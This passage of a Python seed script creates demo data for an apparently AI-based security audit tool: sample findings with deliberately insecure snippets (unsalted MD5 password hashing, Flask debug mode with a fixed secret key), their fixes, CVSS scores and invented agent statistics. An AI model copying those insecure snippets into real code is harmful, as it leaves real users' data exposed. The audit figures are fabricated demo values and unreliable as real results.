            "fix_code": '''from urllib.parse import urlparse
import ipaddress

ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

def is_safe_url(url):
    parsed = urlparse(url)

    # 检查协议
    if parsed.scheme not in ['http', 'https']:
        return False

    # 检查是否在白名单
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # 检查是否为内网地址
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        pass

    return True

@app.route('/api/proxy')
def proxy_request():
    target_url = request.args.get('url')

    if not is_safe_url(target_url):
        return "Invalid URL", 400

    response = requests.get(target_url, timeout=5)
    return response.content''',
            "references": [
                {"type": "CWE", "id": "CWE-918", "url": "https://cwe.mitre.org/data/definitions/918.html"},
                {"type": "OWASP", "id": "A10:2021", "url": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"},
            ],
            "ai_confidence": 0.94,
            "cvss_score": 8.6,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
            "tags": ["owasp-top10", "ssrf", "cloud-metadata"],
        },
        {
            "vulnerability_type": VulnerabilityType.HARDCODED_SECRET,
            "severity": VulnerabilitySeverity.MEDIUM,
            "title": "发现硬编码的 API 密钥（误报）",
            "description": "在配置文件中发现硬编码的 API 密钥，经验证为示例配置模板中的占位符。",
            "file_path": "app/config.py.example",
            "line_start": 15,
            "line_end": 18,
            "code_snippet": '''# 示例配置文件 - 请复制为 config.py 并替换实际值
API_KEY = "your-api-key-here"  # 请替换为实际密钥
SECRET_KEY = "change-this-secret"  # 请替换为随机字符串''',
            "status": FindingStatus.FALSE_POSITIVE,
            "is_verified": False,
            "verification_method": "代码审查 - 确认为示例配置模板",
            "verification_result": {"is_example": True, "reason": "File is .example template, not production config"},
            "suggestion": "确保 .example 文件不被误用，在 .gitignore 中排除实际配置文件",
            "ai_confidence": 0.85,
            "tags": ["false-positive", "configuration"],
        },
        {
            "vulnerability_type": VulnerabilityType.WEAK_CRYPTO,
            "severity": VulnerabilitySeverity.MEDIUM,
            "title": "使用不安全的 MD5 哈希算法存储密码",
            "description": "密码哈希使用了已被破解的 MD5 算法，没有使用盐值，容易受到彩虹表攻击和暴力破解。",
            "file_path": "app/utils/crypto.py",
            "line_start": 8,
            "line_end": 12,
            "function_name": "hash_password",
            "code_snippet": '''import hashlib

def hash_password(password):
    # 危险：使用不安全的 MD5 且无盐值
    return hashlib.md5(password.encode()).hexdigest()''',
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "代码审查 - 确认使用弱哈希算法",
            "suggestion": "使用 bcrypt、Argon2 或 PBKDF2 等专门的密码哈希算法",
            "fix_code": '''import bcrypt

def hash_password(password):
    # 修复：使用 bcrypt 进行安全的密码哈希
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed.encode())''',
            "references": [
                {"type": "CWE", "id": "CWE-327", "url": "https://cwe.mitre.org/data/definitions/327.html"},
                {"type": "CWE", "id": "CWE-916", "url": "https://cwe.mitre.org/data/definitions/916.html"},
            ],
            "ai_confidence": 0.97,
            "cvss_score": 6.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
            "tags": ["cryptography", "password-storage", "md5"],
        },
        {
            "vulnerability_type": "security_misconfiguration",
            "severity": VulnerabilitySeverity.LOW,
            "title": "生产环境启用了调试模式",
            "description": "Flask 应用在生产环境中启用了调试模式，可能泄露敏感信息和允许远程代码执行。",
            "file_path": "app/__init__.py",
            "line_start": 25,
            "line_end": 28,
            "code_snippet": '''# 应用配置
app = Flask(__name__)
app.debug = True  # 警告：生产环境应禁用
app.secret_key = 'development-key'  # 警告：应使用安全密钥''',
            "status": FindingStatus.NEEDS_REVIEW,
            "is_verified": False,
            "suggestion": "在生产环境中禁用调试模式，使用环境变量配置",
            "fix_code": '''import os

app = Flask(__name__)
app.debug = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24))''',
            "references": [
                {"type": "CWE", "id": "CWE-489", "url": "https://cwe.mitre.org/data/definitions/489.html"},
            ],
            "ai_confidence": 0.88,
            "cvss_score": 5.3,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "tags": ["configuration", "debug-mode", "information-disclosure"],
        },
    ]

    findings = []
    for i, fdata in enumerate(findings_data):
        verified_at = None
        if fdata.get("is_verified"):
            verified_at = task.started_at + timedelta(minutes=10 + i)

        finding = AgentFinding(
            id=str(uuid.uuid4()),
            task_id=task.id,
            vulnerability_type=fdata["vulnerability_type"],
            severity=fdata["severity"],
            title=fdata["title"],
            description=fdata.get("description"),
            file_path=fdata.get("file_path"),
            line_start=fdata.get("line_start"),
            line_end=fdata.get("line_end"),
            function_name=fdata.get("function_name"),
            code_snippet=fdata.get("code_snippet"),
            source=fdata.get("source"),
            sink=fdata.get("sink"),
            dataflow_path=fdata.get("dataflow_path"),
            status=fdata.get("status", FindingStatus.NEW),
            is_verified=fdata.get("is_verified", False),
            verification_method=fdata.get("verification_method"),
            verification_result=fdata.get("verification_result"),
            verified_at=verified_at,
            has_poc=fdata.get("has_poc", False),
            poc_code=fdata.get("poc_code"),
            poc_description=fdata.get("poc_description"),
            poc_steps=fdata.get("poc_steps"),
            suggestion=fdata.get("suggestion"),
            fix_code=fdata.get("fix_code"),
            fix_description=fdata.get("fix_description"),
            references=fdata.get("references"),
            ai_explanation=fdata.get("ai_explanation"),
            ai_confidence=fdata.get("ai_confidence"),
            xai_what=fdata.get("xai_what"),
            xai_why=fdata.get("xai_why"),
            xai_how=fdata.get("xai_how"),
            xai_impact=fdata.get("xai_impact"),
            cvss_score=fdata.get("cvss_score"),
            cvss_vector=fdata.get("cvss_vector"),
            tags=fdata.get("tags"),
            created_at=task.started_at + timedelta(minutes=5 + i),
        )
        finding.fingerprint = finding.generate_fingerprint()
        findings.append(finding)
        db.add(finding)

    await db.flush()
    print(f"✓ 创建了 {len(findings)} 个漏洞发现")

    return findings


async def create_agent_tree_nodes(db: AsyncSession, task: AgentTask) -> list:
    """创建 Agent 树节点"""

    nodes_data = [
        {
            "agent_id": "orchestrator-001",
            "agent_name": "主控 Agent",
            "agent_type": "orchestrator",
            "parent_agent_id": None,
            "depth": 0,
            "task_description": "协调整体审计流程，分发子任务",
            "knowledge_modules": ["security_patterns", "vulnerability_db"],
            "status": "completed",
            "result_summary": "成功协调完成安全审计，发现 8 个漏洞",
            "findings_count": 8,
            "iterations": 15,
            "tokens_used": 12500,
            "tool_calls": 25,
            "duration_ms": 780000,
        },
        {
            "agent_id": "analyzer-sql-001",
            "agent_name": "SQL 注入分析 Agent",
            "agent_type": "analyzer",
            "parent_agent_id": "orchestrator-001",
            "depth": 1,
            "task_description": "检测和验证 SQL 注入漏洞",
            "knowledge_modules": ["sql_injection_patterns", "database_security"],
            "status": "completed",
            "result_summary": "发现 1 个严重 SQL 注入漏洞并验证成功",
            "findings_count": 1,
            "iterations": 5,
            "tokens_used": 8200,
            "tool_calls": 18,
            "duration_ms": 120000,
        },
        {
            "agent_id": "analyzer-xss-001",
            "agent_name": "XSS 分析 Agent",
            "agent_type": "analyzer",
            "parent_agent_id": "orchestrator-001",
            "depth": 1,
            "task_description": "检测和验证跨站脚本漏洞",
            "knowledge_modules": ["xss_patterns", "frontend_security"],
            "status": "completed",
            "result_summary": "发现 1 个高危存储型 XSS 漏洞",
            "findings_count": 1,
            "iterations": 4,
            "tokens_used": 6800,
            "tool_calls": 12,
            "duration_ms": 95000,
        },
        {
            "agent_id": "analyzer-cmd-001",
            "agent_name": "命令注入分析 Agent",
            "agent_type": "analyzer",
            "parent_agent_id": "orchestrator-001",
            "depth": 1,
            "task_description": "检测操作系统命令注入漏洞",
            "knowledge_modules": ["command_injection_patterns", "shell_security"],
            "status": "completed",
            "result_summary": "发现 1 个严重命令注入漏洞",
            "findings_count": 1,
            "iterations": 4,
            "tokens_used": 7100,
            "tool_calls": 15,
            "duration_ms": 110000,
        },
        {
            "agent_id": "verifier-001",
            "agent_name": "沙箱验证 Agent",
            "agent_type": "verifier",
            "parent_agent_id": "orchestrator-001",
            "depth": 1,
            "task_description": "在隔离沙箱中验证漏洞可利用性",
            "knowledge_modules": ["exploitation_techniques", "poc_generation"],
            "status": "completed",
            "result_summary": "验证 6 个漏洞，排除 1 个误报",
            "findings_count": 6,
            "iterations": 8,
            "tokens_used": 11080,
            "tool_calls": 17,
            "duration_ms": 180000,
        },
    ]

    nodes = []
    for ndata in nodes_data:
        node = AgentTreeNode(
            id=str(uuid.uuid4()),
            task_id=task.id,
            agent_id=ndata["agent_id"],
            agent_name=ndata["agent_name"],
            agent_type=ndata["agent_type"],
            parent_agent_id=ndata["parent_agent_id"],
            depth=ndata["depth"],
            task_description=ndata["task_description"],
            knowledge_modules=ndata["knowledge_modules"],
            status=ndata["status"],
            result_summary=ndata["result_summary"],
            findings_count=ndata["findings_count"],
            iterations=ndata["iterations"],
            tokens_used=ndata["tokens_used"],
            tool_calls=ndata["tool_calls"],
            duration_ms=ndata["duration_ms"],
            created_at=task.started_at,
            started_at=task.started_at + timedelta(seconds=10),
            finished_at=task.completed_at,
        )
        nodes.append(node)
        db.add(node)

    await db.flush()
    print(f"✓ 创建了 {len(nodes)} 个 Agent 树节点")

    return nodes


async def main():
    """主函数"""
    print("=" * 60)
    print("创建 Agent 审计任务演示数据")
    print("=" * 60)

    # 创建数据库连接
    engine = create_async_engine(settings.DATABASE_URL, echo=False, future=True)
    async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async with async_session() as db:
        try:
            # 获取演示用户
            result = await db.execute(select(User).where(User.email == "demo@example.com"))
            demo_user = result.scalars().first()

            if not demo_user:
                print("❌ 未找到演示用户 (demo@example.com)")
                print("请先运行应用初始化数据库")
                return

            print(f"使用演示用户: {demo_user.email}")

            # 创建或获取演示项目
            project = await get_or_create_demo_project(db, demo_user.id)

            # 创建 Agent 任务
            task = await create_agent_demo_task(db, project, demo_user.id)

            # 创建事件流
            await create_agent_events(db, task)

            # 创建漏洞发现
            await create_agent_findings(db, task)

            # 创建 Agent 树节点
            await create_agent_tree_nodes(db, task)

            # 提交事务
            await db.commit()

            print("=" * 60)
            print("✅ Agent 演示数据创建完成！")
            print(f"   任务 ID: {task.id}")
            print(f"   项目: {project.name}")
            print(f"   发现漏洞: {task.findings_count} 个")
            print(f"   严重程度分布:")
            print(f"     - Critical: {task.critical_count}")
            print(f"     - High: {task.high_count}")
            print(f"     - Medium: {task.medium_count}")
            print(f"     - Low: {task.low_count}")
            print("=" * 60)

        except Exception as e:
            await db.rollback()
            print(f"❌ 创建失败: {e}")
            import traceback
            traceback.print_exc()
            raise


if __name__ == "__main__":
    asyncio.run(main())
